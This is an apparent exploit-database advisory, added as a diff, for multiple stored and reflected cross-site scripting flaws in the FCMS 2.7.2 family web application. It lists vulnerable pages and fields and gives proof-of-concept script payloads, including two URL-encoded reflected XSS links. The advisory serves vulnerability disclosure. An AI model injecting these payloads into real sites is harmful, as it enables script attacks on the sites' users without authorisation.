@@ -1,0 +1,55 @@
+FCMS_2.7.2 cms and earlier multiple stored XSS Vulnerability
+===================================================================================
+# Exploit Title: FCMS_2.7.2 cms multiple stored XSS Vulnerability
+
+Download link :http://sourceforge.net/projects/fam-connections/files/Family%20Connections/2.7.2/FCMS_2.7.2.zip/download
+
+# Author: Ahmed Elhady Mohamed
+
+# Category:: webapps
+
+# Tested on: windows XP Sp2 En
+
+===================================================================================
+
+
+
+#First we must install all optional sections during installation process.
+
+        #############################################Stored XSS################################################################
+
+
+         page : messageboard.php?thread=1	
+
+	 decription: if you ADD javascript code in " reply " field , the code will execute in " profile.php?member=1 " page.
+
+
+	page : familynews.php?addnews=yes
+
+	description : when you add news you can put js in " text area " field to execute
+
+
+	page : prayers.php
+
+	description : when you add prayer  ,you can inject js in "pray for" field as "<script>alert(/xss/)</script>"
+
+
+	page : recipes.php?add=category
+
+	description : insert in "name" field  "><script>alert(/xss/)</script> , it will execute at "recipes.php?addrecipe=yes" page
+
+	
+	page : calendar.php?add=2011-12-2
+
+	description : when add an event, insert in "Event" field ("<script>alert(/xss/)</script>")
+	
+	it will execute at  "calendar.php" page
+
+	################################Reflected XSS#################################################################################
+
+	These pages have reflected xss .
+	
+	calendar.php?add=2011-12-7%22%3E%3Cscript%3Ealert%28/family/%29%3C/script%3E
+
+	gallery/index.php?uid=%22%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E
+ 	##############################################################################################################################
